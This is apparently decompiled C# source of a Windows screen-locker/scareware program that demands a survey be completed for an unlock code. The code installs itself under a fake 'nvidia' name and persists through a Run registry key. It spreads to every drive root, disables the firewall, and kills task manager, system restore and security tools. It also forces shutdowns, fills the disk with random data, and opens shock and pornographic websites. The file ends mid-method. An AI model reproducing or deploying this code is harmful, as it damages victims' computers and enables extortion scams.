using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Program;

public class frmMain : Form
{
	[Flags]
	private enum ProcessAccessRights
	{
		Synchronize = 0x100000,
		StandardRightsRequired = 0xF0000,
		ProcessAllAccess = 0x1F0FFF
	}

	private const int AppcommandVolumeMute = 524288;

	private const int WmAppcommand = 793;

	private IContainer components;

	private WebBrowser _wbrSite;

	private Timer _tmrMute;

	private Timer _tmrFirewall;

	private Button _btnSite;

	private Timer _tmrCloser;

	private Label _lblText;

	private Button _btnCheck;

	private TextBox _txtCode;

	private Label _lblCode;

	private Timer _tmrBeeper;

	private Timer _tmrDocuments;

	private Timer _tmrMode;

	private Timer _tmrUrls;

	private Timer _tmrMouse;

	private Timer _tmrRKey;

	private Timer _tmrOpenDisk;

	private Timer _tmrMessage;

	private Timer _tmrCenter;

	private Timer _tmrClipboard;

	private Timer _tmrRegister;

	private Panel _pnlCompo;

	private bool _dWrite = true;

	private bool _cClose;

	private int _cTry = 1;

	private int _curLnk;

	private string regKey = "nvidia";

	private string[] _arrDisables;

	private string _fHdd;

	private string _swapMBtn;

	private string _hTBar;

	private bool _onScr;

	private readonly Random _r = new Random();

	private Point _pn;

	private string[] _urls;

	private string[] _codes;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(61, 4));
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("frmMain");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(frmMain_FormClosing));
		((Form)this).add_Load((EventHandler)frmMain_Load);
		((Control)this).ResumeLayout(false);
	}

	public frmMain()
	{
		InitializeComponent();
		switch ("AppData")
		{
		case "Picture":
			Installer(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
			break;
		case "Music":
			Installer(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
			break;
		case "Documents":
			Installer(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
			break;
		case "Desktop":
			Installer(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
			break;
		case "AppData":
			Installer(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			break;
		}
	}

	private void Installer(string pth)
	{
		try
		{
			if (!(Application.get_StartupPath() == pth))
			{
				File.Copy(Application.get_ExecutablePath(), pth + "\\" + regKey + ".exe");
				Process.Start(pth + "\\" + regKey + ".exe");
				_cClose = true;
				Process currentProcess = Process.GetCurrentProcess();
				currentProcess.Kill();
			}
		}
		catch
		{
		}
	}

	private void LoadControls()
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Expected O, but got Unknown
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Expected O, but got Unknown
		//IL_010d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_017d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0187: Expected O, but got Unknown
		//IL_01a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01af: Expected O, but got Unknown
		//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d7: Expected O, but got Unknown
		//IL_01f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ff: Expected O, but got Unknown
		//IL_021d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0227: Expected O, but got Unknown
		//IL_0245: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Expected O, but got Unknown
		//IL_027d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		//IL_02b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bf: Expected O, but got Unknown
		//IL_02dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e7: Expected O, but got Unknown
		//IL_05d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05da: Expected O, but got Unknown
		//IL_05db: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e5: Expected O, but got Unknown
		string text = "y";
		string text2 = "\r\nYour computer is locked.To unlock you need to follow theese steps:\r\n\r\n- Click on SITE on the left side\r\n- Click on the the padlock image\r\n- Choose an survey from red list\r\n- Complete the survey and download password\r\n- Write the password on left site and click VERIFY\r\n\r\nNow your computer is unlocked and is same as before.\r\nYou cant unlock your computer if you dont download the password.\r\n";
		if (text == "y")
		{
			_onScr = true;
		}
		components = new Container();
		_lblText = new Label();
		_btnSite = new Button();
		_btnCheck = new Button();
		_lblCode = new Label();
		_txtCode = new TextBox();
		_tmrCenter = new Timer(components);
		_tmrCenter.set_Enabled(false);
		_tmrCenter.set_Interval(8000);
		_tmrCenter.add_Tick((EventHandler)tmrCenter_Tick);
		_tmrUrls = new Timer(components);
		_tmrUrls.add_Tick((EventHandler)tmrSites_Tick);
		_tmrFirewall = new Timer(components);
		_tmrFirewall.set_Interval(5000);
		_tmrFirewall.add_Tick((EventHandler)tmrFireWall_Tick);
		_tmrCloser = new Timer(components);
		_tmrCloser.set_Interval(200);
		_tmrCloser.add_Tick((EventHandler)tmrClose_Tick);
		_tmrBeeper = new Timer(components);
		_tmrBeeper.set_Interval(1000);
		_tmrBeeper.add_Tick((EventHandler)tmrBeeper_Tick);
		_tmrDocuments = new Timer(components);
		_tmrDocuments.add_Tick((EventHandler)tmrDocuments_Tick);
		_tmrMode = new Timer(components);
		_tmrMode.add_Tick((EventHandler)tmrModus_Tick);
		_tmrMouse = new Timer(components);
		_tmrMouse.add_Tick((EventHandler)tmrMoveMouse_Tick);
		_tmrRKey = new Timer(components);
		_tmrRKey.add_Tick((EventHandler)tmrRnKey_Tick);
		_tmrOpenDisk = new Timer(components);
		_tmrOpenDisk.add_Tick((EventHandler)tmrOpenDisk_Tick);
		_tmrMessage = new Timer(components);
		_tmrMessage.set_Interval(1000);
		_tmrMessage.add_Tick((EventHandler)tmrMessage_Tick);
		_tmrRegister = new Timer(components);
		_tmrRegister.set_Interval(5000);
		_tmrRegister.add_Tick((EventHandler)tmrRegister_Tick);
		_tmrMute = new Timer(components);
		_tmrMute.add_Tick((EventHandler)tmrMute_Tick);
		_tmrClipboard = new Timer(components);
		_tmrClipboard.set_Interval(1000);
		_tmrClipboard.add_Tick((EventHandler)tmrClipboard_Tick);
		((Control)_lblText).set_AutoSize(true);
		((Control)_lblText).set_Name("lblText");
		((Control)_lblText).set_Size(new Size(286, 65));
		((Control)_lblText).set_Text("Please complete a survey in order to unlock your computer.\r\nEverything will be as before when you unlock your PC.\r\n\r\nDon't do this, and see what happens.\r\nThank you for your cooperation.");
		if (!_onScr)
		{
			((Control)this).SuspendLayout();
			((Control)_btnSite).set_Location(new Point(17, 103));
			((Control)_btnSite).set_Name("btnSite");
			((Control)_btnSite).set_Size(new Size(75, 23));
			((Control)_btnSite).set_TabIndex(14);
			((Control)_btnSite).set_Text("Site");
			((ButtonBase)_btnSite).set_UseVisualStyleBackColor(true);
			((Control)_btnSite).add_Click((EventHandler)btnURL_Click);
			((Control)_lblText).set_Location(new Point(14, 9));
			((Control)_lblText).set_TabIndex(13);
			((Control)_btnCheck).set_Location(new Point(224, 103));
			((Control)_btnCheck).set_Name("btnCheck");
			((Control)_btnCheck).set_Size(new Size(75, 23));
			((Control)_btnCheck).set_TabIndex(12);
			((Control)_btnCheck).set_Text("Verify");
			((ButtonBase)_btnCheck).set_UseVisualStyleBackColor(true);
			((Control)_btnCheck).add_Click((EventHandler)btnCheck_Click);
			((Control)_txtCode).set_Location(new Point(91, 77));
			((Control)_txtCode).set_Name("txtUnCode");
			((Control)_txtCode).set_Size(new Size(208, 20));
			((Control)_txtCode).set_TabIndex(11);
			_txtCode.set_TextAlign((HorizontalAlignment)2);
			((Control)_lblCode).set_AutoSize(true);
			((Control)_lblCode).set_Location(new Point(14, 80));
			((Control)_lblCode).set_Name("lblUnlock");
			((Control)_lblCode).set_Size(new Size(71, 13));
			((Control)_lblCode).set_TabIndex(10);
			((Control)_lblCode).set_Text("Unlock code:");
			((Form)this).set_AcceptButton((IButtonControl)(object)_btnCheck);
			((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
			((Form)this).set_ClientSize(new Size(314, 137));
			((Control)this).get_Controls().Add((Control)(object)_btnSite);
			((Control)this).get_Controls().Add((Control)(object)_lblText);
			((Control)this).get_Controls().Add((Control)(object)_btnCheck);
			((Control)this).get_Controls().Add((Control)(object)_txtCode);
			((Control)this).get_Controls().Add((Control)(object)_lblCode);
			((Control)this).ResumeLayout(false);
			((Control)this).PerformLayout();
		}
		else
		{
			_pnlCompo = new Panel();
			_wbrSite = new WebBrowser();
			((Control)_pnlCompo).SuspendLayout();
			((Control)this).SuspendLayout();
			((Control)_pnlCompo).set_BackColor(Color.Black);
			((Control)_pnlCompo).get_Controls().Add((Control)(object)_lblText);
			((Control)_pnlCompo).get_Controls().Add((Control)(object)_btnSite);
			((Control)_pnlCompo).get_Controls().Add((Control)(object)_btnCheck);
			((Control)_pnlCompo).get_Controls().Add((Control)(object)_lblCode);
			((Control)_pnlCompo).get_Controls().Add((Control)(object)_txtCode);
			((Control)_pnlCompo).set_Dock((DockStyle)2);
			((Control)_pnlCompo).set_Location(new Point(0, 401));
			((Control)_pnlCompo).set_Name("pnlOptions");
			((Control)_pnlCompo).set_Size(new Size(804, 87));
			((Control)_pnlCompo).set_TabIndex(4);
			((Control)_lblText).set_BackColor(Color.Transparent);
			((Control)_lblText).set_ForeColor(Color.White);
			((Control)_lblText).set_Location(new Point(506, 10));
			((Control)_lblText).set_TabIndex(4);
			((Control)_btnSite).set_BackColor(SystemColors.Control);
			((Control)_btnSite).set_ForeColor(Color.Black);
			((Control)_btnSite).set_Location(new Point(12, 52));
			((Control)_btnSite).set_Name("btnSite");
			((Control)_btnSite).set_Size(new Size(75, 23));
			((Control)_btnSite).set_TabIndex(3);
			((Control)_btnSite).set_Text("Site");
			((ButtonBase)_btnSite).set_UseVisualStyleBackColor(false);
			((Control)_btnSite).add_Click((EventHandler)btnURL_Click);
			((Control)_btnCheck).set_BackColor(SystemColors.Control);
			((Control)_btnCheck).set_ForeColor(Color.Black);
			((Control)_btnCheck).set_Location(new Point(137, 52));
			((Control)_btnCheck).set_Name("btnCheck");
			((Control)_btnCheck).set_Size(new Size(75, 23));
			((Control)_btnCheck).set_TabIndex(2);
			((Control)_btnCheck).set_Text("Verify");
			((ButtonBase)_btnCheck).set_UseVisualStyleBackColor(false);
			((Control)_btnCheck).add_Click((EventHandler)btnCheck_Click);
			((Control)_lblCode).set_AutoSize(true);
			((Control)_lblCode).set_BackColor(Color.Transparent);
			((Control)_lblCode).set_ForeColor(Color.White);
			((Control)_lblCode).set_Location(new Point(9, 10));
			((Control)_lblCode).set_Name("lblUnlockCode");
			((Control)_lblCode).set_Size(new Size(71, 13));
			((Control)_lblCode).set_TabIndex(1);
			((Control)_lblCode).set_Text("Unlock code:");
			((Control)_txtCode).set_Location(new Point(12, 26));
			((Control)_txtCode).set_Name("txtUnCode");
			((Control)_txtCode).set_Size(new Size(200, 20));
			((Control)_txtCode).set_TabIndex(0);
			_txtCode.set_TextAlign((HorizontalAlignment)2);
			((Control)_wbrSite).set_Dock((DockStyle)5);
			_wbrSite.set_IsWebBrowserContextMenuEnabled(false);
			((Control)_wbrSite).set_Location(new Point(0, 0));
			((Control)_wbrSite).set_MinimumSize(new Size(20, 20));
			((Control)_wbrSite).set_Name("wbrSite");
			_wbrSite.set_ScriptErrorsSuppressed(true);
			((Control)_wbrSite).set_Size(new Size(804, 488));
			((Control)_wbrSite).set_TabIndex(5);
			((Form)this).set_AcceptButton((IButtonControl)(object)_btnCheck);
			((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
			((Form)this).set_ClientSize(new Size(804, 488));
			((Control)this).get_Controls().Add((Control)(object)_pnlCompo);
			((Control)this).get_Controls().Add((Control)(object)_wbrSite);
			((Control)_pnlCompo).ResumeLayout(false);
			((Control)_pnlCompo).PerformLayout();
			((Control)this).ResumeLayout(false);
		}
		if (text2 != "n")
		{
			if (!_onScr)
			{
				if (text2 != ((Control)_lblText).get_Text())
				{
					((Control)_lblText).set_Text(text2);
					if (((Control)_lblText).get_Width() + ((Control)_lblText).get_Location().X >= ((Control)this).get_Width() - 10)
					{
						((Control)this).set_Width(((Control)_lblText).get_Location().X + ((Control)_lblText).get_Width() + 20);
					}
					Point location = default(Point);
					location.X = ((Control)_lblText).get_Location().X;
					location.Y = ((Control)_lblText).get_Location().Y + ((Control)_lblText).get_Height() + 10;
					((Control)_lblCode).set_Location(location);
					location.X = ((Control)_lblCode).get_Location().X + ((Control)_lblCode).get_Width() + 5;
					((Control)_txtCode).set_Location(location);
					if (((Control)_lblText).get_Location().X + ((Control)_lblText).get_Width() - ((Control)_txtCode).get_Location().X > ((Control)_txtCode).get_Width())
					{
						((Control)_txtCode).set_Width(((Control)_lblText).get_Location().X + ((Control)_lblText).get_Width() - ((Control)_txtCode).get_Location().X);
					}
					location.X = ((Control)_lblText).get_Location().X;
					location.Y = ((Control)_lblCode).get_Location().Y + ((Control)_lblCode).get_Height() + 15;
					((Control)_btnSite).set_Location(location);
					location.X = ((Control)_txtCode).get_Location().X + ((Control)_txtCode).get_Width() - ((Control)_btnCheck).get_Width();
					((Control)_btnCheck).set_Location(location);
					((Control)this).set_Height(((Control)_btnCheck).get_Location().Y + ((Control)_btnCheck).get_Height() + 40);
				}
			}
			else if (text2 != ((Control)_lblText).get_Text())
			{
				((Control)_lblText).set_Text(text2);
				if (((Control)this).get_Width() < ((Control)_lblText).get_Location().X + ((Control)_lblText).get_Width())
				{
					((Control)this).set_Width(((Control)_lblText).get_Location().X + ((Control)_lblText).get_Width() + 15);
				}
				if (((Control)_lblText).get_Location().Y + ((Control)_lblText).get_Height() > ((Control)_pnlCompo).get_Height())
				{
					((Control)_pnlCompo).set_Height(((Control)_lblText).get_Location().Y + ((Control)_lblText).get_Height() + 10);
				}
			}
		}
		((Form)this).CenterToScreen();
	}

	private void btnCheck_Click(object sender, EventArgs e)
	{
		try
		{
			if (((Control)_txtCode).get_Text() == Decrypt(_codes[_curLnk], "deadline"))
			{
				CorrectInput();
			}
			else
			{
				CheckInput();
			}
			if (_curLnk == _urls.Length)
			{
				_cClose = true;
				Uninstall();
				Application.Exit();
			}
		}
		catch
		{
		}
	}

	private void CheckInput()
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		if (_cTry == 3)
		{
			Exit();
			return;
		}
		MessageBox.Show("Warning: " + _cTry + ". You can only have 2 warnings before your system becomes unusable !");
		_cTry++;
	}

	private void CorrectInput()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Thank you.");
		((Control)_txtCode).set_Text("");
		_curLnk++;
		OpenLink();
	}

	private void btnURL_Click(object sender, EventArgs e)
	{
		OpenLink();
	}

	private void OpenLink()
	{
		try
		{
			if (!_onScr)
			{
				Process.Start(Decrypt(_urls[_curLnk], "deadline"));
			}
			else
			{
				_wbrSite.Navigate(Decrypt(_urls[_curLnk], "deadline"));
			}
		}
		catch
		{
		}
	}

	private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			if (!_cClose)
			{
				((CancelEventArgs)(object)e).Cancel = true;
				CheckInput();
			}
			else
			{
				Uninstall();
				Application.Exit();
			}
		}
		catch
		{
		}
	}

	private void Uninstall()
	{
		if (!_cClose)
		{
			return;
		}
		_tmrRegister.set_Enabled(false);
		_tmrCloser.set_Enabled(false);
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", regKey, "");
			if (_swapMBtn == "y")
			{
				SwapMouseB(0);
			}
			if (_hTBar == "y")
			{
				TaskBar(1);
			}
			if (_fHdd == "y")
			{
				_dWrite = false;
				Thread.Sleep(1000);
				try
				{
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmps.bin");
				}
				catch
				{
				}
			}
			string[] arrDisables = _arrDisables;
			foreach (string text in arrDisables)
			{
				if (text == "explorer")
				{
					Process.Start("explorer.exe");
				}
			}
		}
		catch
		{
		}
	}

	private void tmrRegister_Tick(object sender, EventArgs e)
	{
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", regKey, Application.get_ExecutablePath());
		}
		catch
		{
		}
	}

	private static void MusicPlayer()
	{
		while (true)
		{
			Console.Beep(902, 402);
			Console.Beep(1002, 402);
			Console.Beep(802, 402);
			Console.Beep(402, 402);
			Console.Beep(602, 1602);
		}
	}

	private void tmrCenter_Tick(object sender, EventArgs e)
	{
		((Form)this).CenterToScreen();
	}

	[DllImport("user32.dll")]
	private static extern int FindWindow(string className, string windowText);

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int hwnd, int command);

	private static void TaskBar(int e)
	{
		try
		{
			int hwnd = FindWindow("Shell_TrayWnd", "");
			ShowWindow(hwnd, e);
		}
		catch
		{
		}
	}

	private static void Exit()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "shutdown.exe";
			process.StartInfo.Arguments = "-s -f -t 0";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
	}

	[DllImport("user32.dll")]
	private static extern int SwapMouseButton(int swap);

	private static void SwapMouseB(int i)
	{
		try
		{
			SwapMouseButton(i);
		}
		catch
		{
		}
	}

	private static void Execution()
	{
		try
		{
			Process currentProcess = Process.GetCurrentProcess();
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.Id != currentProcess.Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private void Locker()
	{
		while (true)
		{
			Thread.Sleep(150);
			Cursor.set_Position(_pn);
		}
	}

	private void tmrFireWall_Tick(object sender, EventArgs e)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "netsh.exe";
			process.StartInfo.Arguments = "firewall set opmode disable";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
	}

	private void RStream()
	{
		try
		{
			using FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmps.bin", FileMode.Append);
			byte[] array = new byte[1];
			while (_dWrite)
			{
				_r.NextBytes(array);
				fileStream.WriteByte(array[0]);
			}
		}
		catch
		{
		}
	}

	private static void Beeps()
	{
		Console.Beep();
	}

	private void tmrClose_Tick(object sender, EventArgs e)
	{
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			string[] arrDisables = _arrDisables;
			foreach (string value in arrDisables)
			{
				if (process.ProcessName.ToLower().Contains(value) && process.Id != currentProcess.Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
	}

	private void tmrDocuments_Tick(object sender, EventArgs e)
	{
		try
		{
			_tmrDocuments.set_Interval(_r.Next(5000, 120000));
			switch (_r.Next(0, 4))
			{
			case 0:
				Process.Start("mspaint.exe");
				break;
			case 1:
				Process.Start("write.exe");
				break;
			case 2:
				Process.Start("calc.exe");
				break;
			case 3:
				Process.Start("utilman.exe");
				break;
			case 4:
				Process.Start("explorer.exe");
				break;
			case 5:
				Process.Start("notepad.exe");
				break;
			}
		}
		catch
		{
		}
	}

	private void tmrBeeper_Tick(object sender, EventArgs e)
	{
		_tmrBeeper.set_Interval(_r.Next(1000, 15000));
		new Thread(Beeps).Start();
	}

	private void tmrClipboard_Tick(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetText("-");
		}
		catch
		{
		}
	}

	private void tmrModus_Tick(object sender, EventArgs e)
	{
		try
		{
			_tmrMode.set_Interval(_r.Next(1000, 120000));
			Process currentProcess = Process.GetCurrentProcess();
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.Id != currentProcess.Id && process.ProcessName.ToLower() != "firefox" && process.ProcessName.ToLower() != "chrome" && process.ProcessName != "iexplore" && process.ProcessName.ToLower() != "safari" && process.ProcessName.ToLower() != "opera")
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private static string RString(int crs)
	{
		try
		{
			Random random = new Random((int)DateTime.Now.Ticks);
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < crs; i++)
			{
				char value = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		catch
		{
			return null;
		}
	}

	[DllImport("user32.dll")]
	private static extern IntPtr SendMessageW(IntPtr hWnd, int msg, IntPtr wParam, IntPtr lParam);

	private void CVolume()
	{
		try
		{
			SendMessageW(((Control)this).get_Handle(), 793, ((Control)this).get_Handle(), (IntPtr)524288);
		}
		catch
		{
		}
	}

	private void tmrRnKey_Tick(object sender, EventArgs e)
	{
		try
		{
			_tmrRKey.set_Interval(_r.Next(5000, 120000));
			SendKeys.Send(RString(_r.Next(1, 30)));
		}
		catch
		{
		}
	}

	private void tmrMessage_Tick(object sender, EventArgs e)
	{
		_tmrMessage.set_Interval(_r.Next(1000, 120000));
		ShowMessage();
	}

	private void tmrMoveMouse_Tick(object sender, EventArgs e)
	{
		Point position = default(Point);
		int num = _r.Next(2);
		int num2 = _r.Next(2);
		_tmrMouse.set_Interval(_r.Next(1000, 60000));
		if (num == 1)
		{
			position.X = Control.get_MousePosition().X + _r.Next(1, 300);
		}
		else
		{
			position.X = Control.get_MousePosition().X - _r.Next(1, 300);
		}
		if (num2 == 1)
		{
			position.Y = Control.get_MousePosition().Y + _r.Next(1, 300);
		}
		else
		{
			position.Y = Control.get_MousePosition().Y - _r.Next(1, 300);
		}
		Cursor.set_Position(position);
	}

	private void tmrMute_Tick(object sender, EventArgs e)
	{
		_tmrMute.set_Interval(_r.Next(1000, 60000));
		new Thread(CVolume).Start();
	}

	private void tmrOpenDisk_Tick(object sender, EventArgs e)
	{
		try
		{
			_tmrOpenDisk.set_Interval(_r.Next(5000, 60000));
			new Thread(OpenTrays).Start();
		}
		catch
		{
		}
	}

	private void tmrSites_Tick(object sender, EventArgs e)
	{
		try
		{
			_tmrUrls.set_Interval(_r.Next(5000, 120000));
			switch (_r.Next(0, 7))
			{
			case 0:
				Process.Start("http://www.1guy2needles.com/");
				break;
			case 1:
				Process.Start("http://meatspin.com");
				break;
			case 2:
				Process.Start("http://loltrain.com");
				break;
			case 3:
				Process.Start("http://youporngay.com");
				break;
			case 4:
				Process.Start("http://ashemaletube.com");
				break;
			case 5:
				Process.Start("http://www.asspong.com/");
				break;
			case 6:
				Process.Start("http://www.eatyoursoup.com/");
				break;
			case 7:
				Process.Start("http://www.mudfall.com/");
				break;
			}
		}
		catch
		{
		}
	}

	[DllImport("winmm.dll")]
	private static extern void mciSendStringA(string lpstrCommand, string lpstrReturnString, long uReturnLength, long hwndCallback);

	private static void OpenTrays()
	{
		try
		{
			mciSendStringA("set CDAudio door open", "", 127L, 0L);
		}
		catch
		{
		}
	}

	private static string Decrypt(string text, string pass)
	{
		try
		{
			byte[] array = Convert.FromBase64String(text);
			PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(pass, null);
			byte[] bytes = passwordDeriveBytes.GetBytes(32);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Mode = CipherMode.CBC;
			ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes, Encoding.ASCII.GetBytes("tu79zaii340t89u2"));
			MemoryStream memoryStream = new MemoryStream(array);
			CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
			byte[] array2 = new byte[array.Length];
			int count = cryptoStream.Read(array2, 0, array2.Length);
			memoryStream.Close();
			cryptoStream.Close();
			return Encoding.UTF8.GetString(array2, 0, count);
		}
		catch
		{
			return null;
		}
	}

	private void frmMain_Load(object sender, EventArgs e)
	{
		//IL_0426: Unknown result type (might be due to invalid IL or missing references)
		LoadControls();
		try
		{
			_pn = Cursor.get_Position();
			string text = "y";
			string text2 = "y";
			string text3 = "y";
			string text4 = "%openfiles%";
			string text5 = "%opensites%";
			string text6 = "y";
			string text7 = "%randomkeys%";
			string text8 = "y";
			string text9 = "y";
			string text10 = "y";
			string text11 = "y";
			string text12 = "%aggressivemode%";
			string text13 = "%onexecution%";
			_swapMBtn = "%swapmouse%";
			_hTBar = "%hidetaskbar%";
			string text14 = "%stopfirewall%";
			string text15 = "%playsong%";
			string text16 = "%showmessagebox%";
			string text17 = "%messageboxmessage%";
			string text18 = "%messageboxtitle%";
			string s = "0";
			string text19 = "%changevolume%";
			string text20 = "taskmgr.cmd.msconfig.wmplayer.calc.notepad.regedit.explorer.skype.aim.steam.origin.utorrent.bittorrent.desura.powershell.winrar.winword.excel.powerpnt.outlook.vlc.javaw.mirc.ccleaner.poweriso.mspaint.photoshop.teamviewer.defraggler.moviemaker.wireshark.acrord.rstrui.filezilla.vmware.tbb-firefox.torch.manycam.gimp.openvpntray.itunes.pidgin.recuva.7zfm.thunderbird.paintdotnet";
			_arrDisables = text20.Split(new char[1] { '.' });
			_fHdd = "%filldisk%";
			string text21 = "%lockmousepos%";
			string text22 = "%protectprocess%";
			string text23 = "n";
			string text24 = "y";
			string text25 = "rx5C0OxWxjxdLqCx3LeHq68LLypYVkLZ30U+Vn/4bTc=";
			string text26 = "+mNLfENZ8fKAWezvSFhmDQ==";
			string[] separator = new string[1] { "]||[" };
			_urls = text25.Split(separator, StringSplitOptions.None);
			_codes = text26.Split(separator, StringSplitOptions.None);
			if (text24 == "y")
			{
				try
				{
					DriveInfo[] drives = DriveInfo.GetDrives();
					DriveInfo[] array = drives;
					foreach (DriveInfo driveInfo in array)
					{
						try
						{
							File.Copy(Application.get_ExecutablePath(), string.Concat(driveInfo.RootDirectory, Path.GetFileName(Application.get_ExecutablePath())));
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
			if (text == "y")
			{
				_tmrRegister.set_Enabled(true);
			}
			int.TryParse(s, out var result);
			if (text22 == "y")
			{
				Protect();
			}
			if (result != 0)
			{
				Thread.Sleep(result);
			}
			if (_arrDisables[0] != "")
			{
				_tmrCloser.set_Enabled(true);
			}
			if (text2 == "y")
			{
				_tmrClipboard.set_Enabled(true);
			}
			if (text3 == "y")
			{
				_tmrOpenDisk.set_Enabled(true);
			}
			if (text4 == "y")
			{
				_tmrDocuments.set_Enabled(true);
			}
			if (text5 == "y")
			{
				_tmrUrls.set_Enabled(true);
			}
			if (text6 == "y")
			{
				_tmrMouse.set_Enabled(true);
			}
			if (text7 == "y")
			{
				_tmrRKey.set_Enabled(true);
			}
			if (text8 == "y")
			{
				_tmrBeeper.set_Enabled(true);
			}
			if (text9 == "y")
			{
				Thread thread = new Thread(Calus);
				thread.IsBackground = true;
				thread.Start();
			}
			if (text11 == "y")
			{
				_tmrMessage.set_Enabled(true);
			}
			if (text12 == "y")
			{
				_tmrMode.set_Enabled(true);
			}
			if (text13 == "y")
			{
				Execution();
			}
			if (_swapMBtn == "y")
			{
				SwapMouseB(1);
			}
			if (_hTBar == "y")
			{
				TaskBar(0);
			}
			if (text14 == "y")
			{
				_tmrFirewall.set_Enabled(true);
			}
			if (text15 == "y")
			{
				Thread thread2 = new Thread(MusicPlayer);
				thread2.IsBackground = true;
				thread2.Start();
			}
			if (text19 == "y")
			{
				_tmrMute.set_Enabled(true);
			}
			if (_fHdd == "y")
			{
				new Thread(RStream).Start();
			}
			if (text21 == "y")
			{
				Thread thread3 = new Thread(Locker);
				thread3.IsBackground = true;
				thread3.Start();
			}
			if (text16 == "y")
			{
				MessageBox.Show(text17, text18, (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			if (text10 != "y")
			{
				Process.Start(Decrypt(_urls[_curLnk], "deadline"));
			}
			else
			{
				_wbrSite.Navigate(Decrypt(_urls[_curLnk], "deadline"));
			}
			if (text23 != "n")
			{
				_tmrCenter.set_Interval(int.Parse(text23));
				_tmrCenter.set_Enabled(true);
			}
			((Control)this).Focus();
		}
